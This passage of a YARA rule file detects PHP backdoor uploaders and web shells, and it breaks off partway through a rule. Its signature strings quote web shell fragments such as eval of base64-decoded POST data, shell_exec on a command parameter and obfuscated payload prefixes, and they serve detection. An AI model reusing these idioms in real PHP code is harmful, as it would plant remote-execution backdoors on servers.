private rule PR03202 : trigger
{
    strings:
        $ps0 = "if (isset($_FILES[$"
    condition:
        $ps0
}

rule php_backdoor_uploader_470 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR00046 and PR03201 and PR03202 and PR03148 and PR01021
}

private rule PR03203 : trigger
{
    strings:
        $ps0 = "for ($i = 0; $i < $count; $i++) { if(move_uploaded_file"
    condition:
        $ps0
}

rule php_backdoor_uploader_471 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00046 and PR03148 and PR03203 and PR01021 and PR02769
}

private rule PR03204 : trigger
{
    strings:
        $ps0 = "$allowtype = array('txt', 'php',"
    condition:
        $ps0
}

rule php_backdoor_uploader_472 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR00046 and PR03204 and PR01021 and PR02769 and PR02870
}

private rule PR03205 : trigger
{
    strings:
        $ps0 = "$title = __("
    condition:
        $ps0
}

private rule PR03206 : trigger
{
    strings:
        $ps0 = "Uploader'); ?></h2>"
    condition:
        $ps0
}

rule php_backdoor_uploader_473 : backdoor
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR00046 and PR03205 and PR03206 and PR02769
}

rule php_backdoor_uploader_474 : backdoor
{
    strings:
        $trigger = "ep1/qhV+Q1StGLCYh7iL1Ig/9Y4DV8sp18"
    condition:
        $trigger and PR02369 and PR02371
}

private rule PR03207 : trigger
{
    strings:
        $ps0 = "equire"
    condition:
        $ps0
}

private rule PR03208 : trigger
{
    strings:
        $ps0 = "]) && isset($_POST['"
    condition:
        $ps0
}

private rule PR03209 : trigger
{
    strings:
        $ps0 = "=\\\".\\\".md5(\\\"$_SERVER[SERVER_NAME]\\\".__FILE__);$"
    condition:
        $ps0
}

rule php_backdoor_uploader_476 : backdoor
{
    strings:
        $trigger = "base64_decode($_POST["
    condition:
        $trigger and PR03209
}

rule php_backdoor_uploader_477 : backdoor
{
    strings:
        $trigger = "if (move_uploaded_file($files['tmp_name'], $fullpath)) {"
    condition:
        $trigger and PR00046 and PR01021 and PR02769 and PR02870
}

private rule PR03210 : trigger
{
    strings:
        $ps0 = "<title>L3gacy Uploader"
    condition:
        $ps0
}

rule php_backdoor_uploader_478 : backdoor
{
    strings:
        $trigger = "<form"
    condition:
        $trigger and PR01330 and PR03210
}

private rule PR03211 : trigger
{
    strings:
        $ps0 = "Avinash Kumar Thapa</title>"
    condition:
        $ps0
}

rule php_backdoor_uploader_479 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR03211 and PR02769
}

private rule PR03212 : trigger
{
    strings:
        $ps0 = "copy($file, $file_name) or die(\"<b>"
    condition:
        $ps0
}

rule php_backdoor_uploader_480 : backdoor
{
    strings:
        $trigger = "echo (\"<pre>\" . shell_exec($cmd) . \"</pre>\");"
    condition:
        $trigger and PR00042 and PR00046 and PR03212
}

private rule PR03213 : trigger
{
    strings:
        $ps0 = "$ret = @file_put_contents(sanitizeResourceId($dest), $res);"
    condition:
        $ps0
}

private rule PR03214 : trigger
{
    strings:
        $ps0 = "echo \"pong\";"
    condition:
        $ps0
}

private rule PR03215 : trigger
{
    strings:
        $ps0 = "@storeResource($resource, $_GET[\"dest\"]);"
    condition:
        $ps0
}

rule php_backdoor_uploader_481 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03213 and PR03214 and PR00355 and PR03215 and PR00357
}

private rule PR03216 : trigger
{
    strings:
        $ps0 = "eval(htmlspecialchars_decode(gzinflate(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_uploader_482 : backdoor
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR03216
}

private rule PR03217 : trigger
{
    strings:
        $ps0 = "Sy1LzNHIKMnNKS5ITc5MzEnOSCwqjk9JTc5PSdUoLcqBspISi1PNTGDiKnmJuamaQGANAA"
    condition:
        $ps0
}

rule php_backdoor_uploader_482_02 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR03217 and PR00029 and PR01788
}

private rule PR03218 : trigger
{
    strings:
        $ps0 = "\"checked"
    condition:
        $ps0
}

private rule PR03219 : trigger
{
    strings:
        $ps0 = "<title>File</title>"
    condition:
        $ps0
}

rule php_backdoor_uploader_483 : backdoor
{
    strings:
        $trigger = ".$file."
    condition:
        $trigger and PR03218 and PR03219 and PR00046
}

private rule PR03220 : trigger
{
    strings:
        $ps0 = "$About_4.=@strrev("
    condition:
        $ps0
}

rule php_backdoor_uploader_484 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03220
}

private rule PR03221 : trigger
{
    strings:
        $ps0 = ")]}(base64_decode('UEQ5d2FIQUtaV05vYnl"
    condition:
        $ps0
}

rule php_backdoor_uploader_485 : backdoor
{
    strings:
        $trigger = "${base64_decode('R0xPQkFMUw==')}[base64_decode("
    condition:
        $trigger and PR03221
}

rule php_backdoor_uploader_486 : backdoor
{
    strings:
        $trigger = "fix $x_path :p\\nUname : \".php_uname().\"\\n"
    condition:
        $trigger and PR01458
}

rule php_backdoor_uploader_487 : backdoor
{
    strings:
        $trigger = "explode('##^^@@^^##',base64_decode($_POST["
    condition:
        $trigger and PR01553 and PR01468 and PR01534 and PR01431
}

rule php_backdoor_uploader_488 : backdoor
{
    strings:
        $trigger = "[\"name\"])?\"upload sukses\":\"gagal\";"
    condition:
        $trigger and PR01382 and PR03071 and PR02769 and PR00397
}

rule php_backdoor_uploader_489 : backdoor
{
    strings:
        $trigger = "@assert(str_rot13(\"riny(onfr64_qrpbqr('MKMuoPuvLKAyAw"
    condition:
        $trigger
}

private rule PR03222 : trigger
{
    strings:
        $ps0 = "@file_put_contents(__DIR__.$fileName,$fileContent);"
    condition:
        $ps0
}

rule php_backdoor_uploader_490 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR03222 and PR01899
}

// MANUAL FIX NECESSARY
private rule PR03223 : trigger
{
    strings:
        $ps0 = "<title><?php echo $_SERVER[_"
    condition:
        $ps0
}

rule php_backdoor_uploader_491 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_uploader_491_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR03223 and PR00397 and $php_backdoor_uploader_491_r0
}

rule php_backdoor_uploader_492 : backdoor
{
    strings:
        $trigger = "jZrHCvRAaYX3Br+DGXMxUwuplcUwC"
    condition:
        $trigger and PR02205
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_493 : backdoor
{
    strings:
        $trigger = "fwrite($"
        $php_backdoor_uploader_493_r0 = /while\(!feof\(\$[\w]+\)\)[\s]*\{[\s]*\$[\w]+[\s]*\.=[\s]*fread\(\$[\w]+,[\s]*\$[\w]+\);[\s]*\$[\w]+[\s]*\+=[\s]*\$[\w]+;[\s]*\}[\s]*\}[\s]*else[\s]*\{[\s]*fwrite\(\$[\w]+,[\s]*\$[\w]+\);/
    condition:
        $trigger and PR01780 and $php_backdoor_uploader_493_r0
}

rule php_backdoor_uploader_494 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($_FILES[\"filename\"][\"tmp_name\"],$_FILES[\"filename\"][\"name\"]);"
    condition:
        $trigger and PR02936
}

private rule PR03224 : trigger
{
    strings:
        $ps0 = "document.location.href="
    condition:
        $ps0
}

rule php_backdoor_uploader_495 : backdoor
{
    strings:
        $trigger = "]($_FILES)!=round(0)){if(isset($_FILES)&& $_FILES[_"
    condition:
        $trigger and PR01382 and PR02769 and PR03224
}

private rule PR03225 : trigger
{
    strings:
        $ps0 = "($wp2wp("
    condition:
        $ps0
}

rule php_backdoor_uploader_496 : backdoor
{
    strings:
        $trigger = ".png'"
    condition:
        $trigger and PR00435 and PR03225
}

rule php_backdoor_uploader_497 : backdoor
{
    strings:
        $trigger = "{echo basename($_FILES[\"fname\"][\"name\"]).\"file had be up\";}else{echo \"the page normal\";}"
    condition:
        $trigger
}

private rule PR03226 : trigger
{
    strings:
        $ps0 = "UPLOADER BY GR3Y"
    condition:
        $ps0
}

rule php_backdoor_uploader_498 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR03226
}

rule php_backdoor_uploader_499 : backdoor
{
    strings:
        $trigger = "if (strpos($result,'.ph') == true)"
    condition:
        $trigger and PR01468 and PR01899 and PR01431
}

private rule PR03227 : trigger
{
    strings:
        $ps0 = ")){echo basename($_FILES[\"fname\"][\"name\"])."
    condition:
        $ps0
}

rule php_backdoor_uploader_500 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR00046 and PR03227 and PR03148
}

rule php_backdoor_uploader_501 : backdoor
{
    strings:
        $trigger = "echo '<b>next-hkr!!!"
    condition:
        $trigger and PR00507 and PR02810
}

rule php_backdoor_uploader_502 : backdoor
{
    strings:
        $trigger = "echo \"Uploaded:"
    condition:
        $trigger and PR00046 and PR02769 and PR03137 and PR01648
}

private rule PR03228 : trigger
{
    strings:
        $ps0 = "$_SERVER['DOCUMENT_ROOT'].$_REQUEST['path'];"
    condition:
        $ps0
}

rule php_backdoor_uploader_503 : backdoor
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR00046 and PR01468 and PR03228
}

private rule PR03229 : trigger
{
    strings:
        $ps0 = "copy(\"copy.php\", \"../copy.php\");"
    condition:
        $ps0
}

private rule PR03230 : trigger
{
    strings:
        $ps0 = "<br><br><br><a href='$"
    condition:
        $ps0
}

rule php_backdoor_uploader_504 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03229 and PR00046 and PR03148 and PR01021 and PR03230 and PR02769
}

private rule PR03231 : trigger
{
    strings:
        $ps0 = "Xhoc41wP3XA+etZlE8"
    condition:
        $ps0
}

rule php_backdoor_uploader_505 : backdoor
{
    strings:
        $trigger = "strrev("
    condition:
        $trigger and PR00029 and PR03231 and PR01436
}

rule php_backdoor_uploader_506 : backdoor
{
    strings:
        $trigger = "7X19X9u4svDf9FOoXnadb"
    condition:
        $trigger and PR00029 and PR01436
}

rule php_backdoor_uploader_507 : backdoor
{
    strings:
        $trigger = "$_path = $_GET['1']; if($_GET['0']==\"UP\"){@file_put_contents(\"$_path/"
    condition:
        $trigger
}

rule php_backdoor_uploader_507_02 : backdoor
{
    strings:
        $trigger = "Xsam_Xadoo"
    condition:
        $trigger and PR00091
}

private rule PR03232 : trigger
{
    strings:
        $ps0 = "json_decode(curlGet(\"{$baseapi}install?files={$bank}"
    condition:
        $ps0
}

rule php_backdoor_uploader_508 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR03232
}

private rule PR03233 : trigger
{
    strings:
        $ps0 = "$process = fopen( $this->"
    condition:
        $ps0
}

rule php_backdoor_uploader_509 : backdoor
{
    strings:
        $trigger = "curl_init("
    condition:
        $trigger and PR00435 and PR03233 and PR02099
}

private rule PR03234 : trigger
{
    strings:
        $ps0 = "@md5(file_get_contents($"
    condition:
        $ps0
}

rule php_backdoor_uploader_510 : backdoor
{
    strings:
        $trigger = "!file_exists($"
    condition:
        $trigger and PR03234 and PR01468
}

private rule PR03235 : trigger
{
    strings:
        $ps0 = "if(copy($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_511 : backdoor
{
    strings:
        $trigger = "echo '<b>Upload"
    condition:
        $trigger and PR00046 and PR01330 and PR03235
}

private rule PR03236 : trigger
{
    strings:
        $ps0 = "PHP Uploader - Yacine_Mohamed\""
    condition:
        $ps0
}

rule php_backdoor_uploader_512 : backdoor
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR00046 and PR02987 and PR03236
}

private rule PR03237 : trigger
{
    strings:
        $ps0 = "if(!empty ($_FILES['uploads'])){move_uploaded_file($_FILES["
    condition:
        $ps0
}

private rule PR03238 : trigger
{
    strings:
        $ps0 = "echo '<form"
    condition:
        $ps0
}

rule php_backdoor_uploader_513 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR01780 and PR03237 and PR03238
}

private rule PR03239 : trigger
{
    strings:
        $ps0 = "$a = $_POST['code'];"
    condition:
        $ps0
}

rule php_backdoor_uploader_514 : backdoor
{
    strings:
        $trigger = "$file = @fopen($_POST['file'],'w');"
    condition:
        $trigger and PR03239
}

rule php_backdoor_uploader_515 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($_FILES[\"new_action\"][\"tmp_name\"], $do_set ."
    condition:
        $trigger
}

rule php_backdoor_uploader_516 : backdoor
{
    strings:
        $trigger = "[\"\\x64\\x65\\x6c\"]==\"my_code\"){$"
    condition:
        $trigger and PR00719 and PR01613
}

private rule PR03240 : trigger
{
    strings:
        $ps0 = "JGIgPSAiV1VIdENGTnZJU2NXWjBFMXJTSU9ESFYzRng4"
    condition:
        $ps0
}

rule php_backdoor_uploader_517 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR03240
}

private rule PR03241 : trigger
{
    strings:
        $ps0 = "if((time()-(int)$xml[q('scd')])>300) $need_remote=true;"
    condition:
        $ps0
}

rule php_backdoor_uploader_518 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03241 and PR01431
}

rule php_backdoor_uploader_519 : backdoor
{
    strings:
        $trigger = "@assert(str_rot13(\"riny(tmvasyngr(onfr64_qrpbqr(fgeeri('==jC8//3sss"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR03242 : trigger
{
    strings:
        $ps0 = ";echo \"<form method='POST"
    condition:
        $ps0
}

rule php_backdoor_uploader_520 : backdoor
{
    strings:
        $trigger = "$_FILES["
        $php_backdoor_uploader_520_r0 = /echo\s*['\"]\s*<form\s*method=['\"]POST['\"]\s*enctype=['\"]multipart\/form-data['\"]/
    condition:
        $trigger and PR01648 and PR03242 and $php_backdoor_uploader_520_r0
}

private rule PR03243 : trigger
{
    strings:
        $ps0 = "WpDJrqNTAAA/dF7EAXVpUjnYrDa7zX4Z0ex"
    condition:
        $ps0
}

rule php_backdoor_uploader_521 : backdoor
{
    strings:
        $trigger = "eval(str_rot13(gzinflate(str_rot13(base64_decode("
    condition:
        $trigger and PR03243
}

private rule PR03244 : trigger
{
    strings:
        $ps0 = "if (mail("
    condition:
        $ps0
}

rule php_backdoor_uploader_523 : backdoor
{
    strings:
        $trigger = ", \"w\") or die("
    condition:
        $trigger and PR00203 and PR01403 and PR03244
}

private rule PR03245 : trigger
{
    strings:
        $ps0 = "] ==1) {if($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_524 : backdoor
{
    strings:
        $trigger = "]){move_uploaded_file($_FILES["
    condition:
        $trigger and PR03245 and PR01468 and PR01431
}

private rule PR03246 : trigger
{
    strings:
        $ps0 = "echo \"http"
    condition:
        $ps0
}

rule php_backdoor_uploader_525 : backdoor
{
    strings:
        $trigger = "file_put_contents($_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR."
    condition:
        $trigger and PR01351 and PR03246
}

private rule PR03247 : trigger
{
    strings:
        $ps0 = "fputs($f,$_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_uploader_525_02 : backdoor
{
    strings:
        $trigger = "'.'.php',\"w\");"
    condition:
        $trigger and PR03247
}

rule php_backdoor_uploader_526 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($_FILES["
    condition:
        $trigger and PR01780 and PR02948
}

private rule PR03248 : trigger
{
    strings:
        $ps0 = "base64_decode('UnVuVGltZQ==')"
    condition:
        $ps0
}

private rule PR03249 : trigger
{
    strings:
        $ps0 = "$_SERVER[base64_decode(\"UkVRVUVTVF9VUkk=\")]) == false"
    condition:
        $ps0
}

rule php_backdoor_uploader_527 : backdoor
{
    strings:
        $trigger = "include_once(base64_decode("
    condition:
        $trigger and PR03248 and PR03249 and PR01458
}

private rule PR03250 : trigger
{
    strings:
        $ps0 = "@touch($"
    condition:
        $ps0
}

rule php_backdoor_uploader_528 : backdoor
{
    strings:
        $trigger = "$wordpress = $filedir.$wordpress_admin;"
    condition:
        $trigger and PR03250
}

rule php_backdoor_uploader_529 : backdoor
{
    strings:
        $trigger = "bVPbjpswEP0AvmLkRmuQtklURX3YAOlD04vUq"
    condition:
        $trigger and PR01860 and PR01590
}

private rule PR03251 : trigger
{
    strings:
        $ps0 = "@array_map($"
    condition:
        $ps0
}

private rule PR03252 : trigger
{
    strings:
        $ps0 = "IGlmKCRfR0VUWy"
    condition:
        $ps0
}

rule php_backdoor_uploader_530 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR03251 and PR03252
}

rule php_backdoor_uploader_531 : backdoor
{
    strings:
        $trigger = "else if (!$_0 && $_COOKIE["
    condition:
        $trigger and PR01330 and PR00046
}

private rule PR03253 : trigger
{
    strings:
        $ps0 = "file_get_contents(${${\""
    condition:
        $ps0
}

rule php_backdoor_uploader_532 : backdoor
{
    strings:
        $trigger = "];exec(${${"
    condition:
        $trigger and PR03253
}

private rule PR03254 : trigger
{
    strings:
        $ps0 = ")){echo basename($_FILES[\"fnm\"][\"name\"])."
    condition:
        $ps0
}

rule php_backdoor_uploader_533 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR00046 and PR03148 and PR03254
}

private rule PR03255 : trigger
{
    strings:
        $ps0 = "&& $_POST['p']=="
    condition:
        $ps0
}

rule php_backdoor_uploader_534 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03255
}

private rule PR03256 : trigger
{
    strings:
        $ps0 = "($name, \"w+\");"
    condition:
        $ps0
}

private rule PR03257 : trigger
{
    strings:
        $ps0 = "file_get_contents($_REQUEST["
    condition:
        $ps0
}

private rule PR03258 : trigger
{
    strings:
        $ps0 = "file_put_contents($name,$f);"
    condition:
        $ps0
}

rule php_backdoor_uploader_535 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR03256 and PR03257 and PR03258
}

rule php_backdoor_uploader_536 : backdoor
{
    strings:
        $trigger = "if (md5($_POST["
    condition:
        $trigger and PR00046 and PR03148 and PR01021 and PR02769 and PR02870
}

private rule PR03259 : trigger
{
    strings:
        $ps0 = "if ($do_set == base64_decode("
    condition:
        $ps0
}

rule php_backdoor_uploader_537 : backdoor
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR00046 and PR01468 and PR03259
}

private rule PR03260 : trigger
{
    strings:
        $ps0 = "if(!isset($url)){"
    condition:
        $ps0
}

rule php_backdoor_uploader_538 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR03260
}

rule php_backdoor_uploader_539 : backdoor
{
    strings:
        $trigger = "zqxEpqjBbIhOmCgyeojO38g9uXVfM7Z3BiEpPhfvfo2va68NWVZsoSJNEKUtoFd0DZbcz/VolI"
    condition:
        $trigger and PR02369 and PR02371
}

private rule PR03261 : trigger
{
    strings:
        $ps0 = "'accept_file_types' => '/\\.(' . $accept_file_types . ')$/i',"
    condition:
        $ps0
}

private rule PR03262 : trigger
{
    strings:
        $ps0 = "$strip = array('php', 'phtml', 'php3', 'php4', 'php5', 'php6', 'php7', 'php8', 'php9', 'php10', 'phps', 'shtml', 'asa', 'cer');"
    condition:
        $ps0
}

private rule PR03263 : trigger
{
    strings:
        $ps0 = "require('UploadHandler.php');"
    condition:
        $ps0
}

rule php_backdoor_uploader_540 : backdoor
{
    strings:
        $trigger = "if( (!isset($_REQUEST['max_file_size'])) || (!isset($_REQUEST['accept_file_types'])) ) {"
    condition:
        $trigger and PR03261 and PR03262 and PR03263
}

rule php_backdoor_uploader_541 : backdoor
{
    strings:
        $trigger = "if($_POST['meki']==\"Crot\"){if(@copy($_FILES["
    condition:
        $trigger and PR00046
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_542 : backdoor
{
    strings:
        $trigger = "ZWNobyAnPGI+QW1Sb2NreS1E"
        $php_backdoor_uploader_542_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and PR00029 and $php_backdoor_uploader_542_r0
}

rule php_backdoor_uploader_543 : backdoor
{
    strings:
        $trigger = "a\" name=\"memek\""
    condition:
        $trigger and PR00046 and PR02987 and PR01330
}

private rule PR03264 : trigger
{
    strings:
        $ps0 = "if(strpos(hex2bin($_COOKIE[hex2bin("
    condition:
        $ps0
}

private rule PR03265 : trigger
{
    strings:
        $ps0 = "stream_context_create(array(\"ssl\"=>array(\"verify_peer"
    condition:
        $ps0
}

rule php_backdoor_uploader_544 : backdoor
{
    strings:
        $trigger = "base64_encode($_COOKIE[hex2bin("
    condition:
        $trigger and PR03264 and PR03265 and PR01431
}

private rule PR03266 : trigger
{
    strings:
        $ps0 = "Permission : <input name=\"perm\" type=\"text\" size=\"4\" value=\"'.substr(sprintf('%o',fileperms($_POST['path'])),"
    condition:
        $ps0
}

rule php_backdoor_uploader_545 : backdoor
{
    strings:
        $trigger = "<form"
    condition:
        $trigger and PR00042 and PR03266
}

private rule PR03267 : trigger
{
    strings:
        $ps0 = "header(\"Location: $"
    condition:
        $ps0
}

rule php_backdoor_uploader_546 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR00046 and PR01021 and PR03267 and PR02769 and PR03137
}

private rule PR03268 : trigger
{
    strings:
        $ps0 = "if (!empty( $_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_547 : backdoor
{
    strings:
        $trigger = "echo 'ok!';"
    condition:
        $trigger and PR01648 and PR03268
}

rule php_backdoor_uploader_548 : backdoor
{
    strings:
        $trigger = "if(!file_exists($dir))mkdir($dir, 0777"
    condition:
        $trigger and PR01369 and PR02388 and PR02973
}

rule php_backdoor_uploader_549 : backdoor
{
    strings:
        $trigger = "@eval(@base64_decode($_POST["
    condition:
        $trigger
}

private rule PR03269 : trigger
{
    strings:
        $ps0 = "]($_FILES[\"f\"][\"tmp_name\"][$"
    condition:
        $ps0
}

rule php_backdoor_uploader_550 : backdoor
{
    strings:
        $trigger = "replace(new RegExp"
    condition:
        $trigger and PR03269 and PR00865 and PR00604
}

rule php_backdoor_uploader_551 : backdoor
{
    strings:
        $trigger = "$path_parts = pathinfo(\"$fdownload\");"
    condition:
        $trigger and PR00042 and PR00046
}

private rule PR03270 : trigger
{
    strings:
        $ps0 = "\"}.=\"\\x"
    condition:
        $ps0
}

private rule PR03271 : trigger
{
    strings:
        $ps0 = "\"}=\"\\x7d\\x3b${\"\\x"
    condition:
        $ps0
}

rule php_backdoor_uploader_552 : backdoor
{
    strings:
        $trigger = "\"}('',''.${\"\\x"
    condition:
        $trigger and PR03270 and PR03271
}

private rule PR03272 : trigger
{
    strings:
        $ps0 = "$system = $_GET['@']; if($system == '@'){"
    condition:
        $ps0
}

rule php_backdoor_uploader_553 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00046 and PR03148 and PR01021 and PR03272 and PR02769
}

rule php_backdoor_uploader_554 : backdoor
{
    strings:
        $trigger = "== 0) move_uploaded_file($_FILES["
    condition:
        $trigger
}

private rule PR03273 : trigger
{
    strings:
        $ps0 = "PGZvcm0gYWN0aW9uP"
    condition:
        $ps0
}

rule php_backdoor_uploader_555 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR03273 and PR01021 and PR00397
}

private rule PR03274 : trigger
{
    strings:
        $ps0 = "=tempnam(ini_get('upload_tmp_dir'), \"0\"));$"
    condition:
        $ps0
}

rule php_backdoor_uploader_556 : backdoor
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR03274
}

private rule PR03275 : trigger
{
    strings:
        $ps0 = "\"]).\"uploaded\";} ?>"
    condition:
        $ps0
}

rule php_backdoor_uploader_557 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00046 and PR03275 and PR03148 and PR01021 and PR02769
}

private rule PR03276 : trigger
{
    strings:
        $ps0 = "]) && (empty($pass)||md5($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_558 : backdoor
{
    strings:
        $trigger = "[chr("
    condition:
        $trigger and PR03276 and PR00046
}

private rule PR03277 : trigger
{
    strings:
        $ps0 = "strrev('stnetnoc_');"
    condition:
        $ps0
}

rule php_backdoor_uploader_559 : backdoor
{
    strings:
        $trigger = "explode("
    condition:
        $trigger and PR03277 and PR01431
}

private rule PR03278 : trigger
{
    strings:
        $ps0 = "${${\""
    condition:
        $ps0
}

rule php_backdoor_uploader_560 : backdoor
{
    strings:
        $trigger = ";}if(file_exists(\"\".$_FILES["
    condition:
        $trigger and PR03278 and PR00719
}

rule php_backdoor_uploader_561 : backdoor
{
    strings:
        $trigger = ".$filePath.'===>success"
    condition:
        $trigger and PR00435 and PR02099 and PR00341
}

private rule PR03279 : trigger
{
    strings:
        $ps0 = ",$_FILES[\"0\"][\"name\"])){echo\"Y\";}else{echo\"N\";}}else{echo\"<form method=post"
    condition:
        $ps0
}

rule php_backdoor_uploader_562 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR03279 and PR02034
}

private rule PR03280 : trigger
{
    strings:
        $ps0 = "fopen(zip_entry_name($"
    condition:
        $ps0
}

rule php_backdoor_uploader_563 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00046 and PR03280 and PR03148 and PR01021 and PR02769
}

private rule PR03281 : trigger
{
    strings:
        $ps0 = "file_get_contents('php://input');"
    condition:
        $ps0
}

rule php_backdoor_uploader_564 : backdoor
{
    strings:
        $trigger = "(array)json_decode(gzinflate(base64_decode($"
    condition:
        $trigger and PR03281
}

private rule PR03282 : trigger
{
    strings:
        $ps0 = "\";}else{echo\"\\x"
    condition:
        $ps0
}

private rule PR03283 : trigger
{
    strings:
        $ps0 = "\";if($_POST[\""
    condition:
        $ps0
}

private rule PR03284 : trigger
{
    strings:
        $ps0 = "\";}}echo \"\\n\\n\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_565 : backdoor
{
    strings:
        $trigger = "\"){if(@copy($_FILES[\"\\x"
    condition:
        $trigger and PR03282 and PR00029 and PR03283 and PR03284
}

// MANUAL FIX NECESSARY
private rule PR03285 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($filetmp,$filename);}"
    condition:
        $ps0
}

rule php_backdoor_uploader_567 : backdoor
{
    strings:
        $trigger = "$_FILES["
        $php_backdoor_uploader_567_r0 = /echo\s*['\"]\s*<form\s*method=['\"]POST['\"]\s*enctype=['\"]multipart\/form-data['\"]/
    condition:
        $trigger and PR03285 and PR01021 and $php_backdoor_uploader_567_r0
}

private rule PR03286 : trigger
{
    strings:
        $ps0 = "$_POST['cmd']"
    condition:
        $ps0
}

rule php_backdoor_uploader_568 : backdoor
{
    strings:
        $trigger = "echo_json($data"
    condition:
        $trigger and PR00435 and PR03286
}

rule php_backdoor_uploader_569 : backdoor
{
    strings:
        $trigger = "ini_set('session.save_path',$_GET["
    condition:
        $trigger
}

private rule PR03287 : trigger
{
    strings:
        $ps0 = "tmp_name'], $_SERVER[\"DOCUMENT_ROOT"
    condition:
        $ps0
}

rule php_backdoor_uploader_570 : backdoor
{
    strings:
        $trigger = "$_FILES['Files"
    condition:
        $trigger and PR01648 and PR03287
}

rule php_backdoor_uploader_571 : backdoor
{
    strings:
        $trigger = ";echo perms(\"$path/$file\");if(is_writable(\"$path/$file\")||!is_readable(\"$path/$file\"))echo"
    condition:
        $trigger and PR01780 and PR01403
}

private rule PR03288 : trigger
{
    strings:
        $ps0 = "']) && md5($_POST['"
    condition:
        $ps0
}

private rule PR03289 : trigger
{
    strings:
        $ps0 = "'){@file_put_contents($_POST['"
    condition:
        $ps0
}

rule php_backdoor_uploader_572 : backdoor
{
    strings:
        $trigger = "(isset($_POST["
    condition:
        $trigger and PR03288 and PR03289
}

private rule PR03290 : trigger
{
    strings:
        $ps0 = "if(isset($_FILES['upload']))"
    condition:
        $ps0
}

rule php_backdoor_uploader_573 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR00046 and PR03290 and PR03148 and PR01021
}

private rule PR03291 : trigger
{
    strings:
        $ps0 = "fopen('php://input"
    condition:
        $ps0
}

private rule PR03292 : trigger
{
    strings:
        $ps0 = "function create(){return str_ireplace("
    condition:
        $ps0
}

rule php_backdoor_uploader_575 : backdoor
{
    strings:
        $trigger = "$base64($code));"
    condition:
        $trigger and PR03292 and PR01372
}

private rule PR03293 : trigger
{
    strings:
        $ps0 = ";$body='domain: '.$_SERVER['name'].'<br> data:"
    condition:
        $ps0
}

rule php_backdoor_uploader_576 : backdoor
{
    strings:
        $trigger = "if(empty($_REQUEST['token']))"
    condition:
        $trigger and PR00437 and PR00301 and PR03293
}

rule php_backdoor_uploader_577 : backdoor
{
    strings:
        $trigger = ")){echo basename($_FILES["
    condition:
        $trigger and PR00046 and PR03148 and PR02769
}

private rule PR03294 : trigger
{
    strings:
        $ps0 = "if (move_uploaded_file($file_tmp, $target_dir . $file_name)) {"
    condition:
        $ps0
}

rule php_backdoor_uploader_578 : backdoor
{
    strings:
        $trigger = "echo \"<h1>File Upload not successfull</h1>\";"
    condition:
        $trigger and PR00042 and PR00046 and PR03294 and PR00251
}

private rule PR03295 : trigger
{
    strings:
        $ps0 = ")){echo basename($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_579 : backdoor
{
    strings:
        $trigger = "[\"name\"]).\"file done\";} echo \"<form enctype"
    condition:
        $trigger and PR03295
}

private rule PR03296 : trigger
{
    strings:
        $ps0 = "if(!empty($"
    condition:
        $ps0
}

private rule PR03297 : trigger
{
    strings:
        $ps0 = "<input type"
    condition:
        $ps0
}

rule php_backdoor_uploader_580 : backdoor
{
    strings:
        $trigger = "value=\"upload"
    condition:
